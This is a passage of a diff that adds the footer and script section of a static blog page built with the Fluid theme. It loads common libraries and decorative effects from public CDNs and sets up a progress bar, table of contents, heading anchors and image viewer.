+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
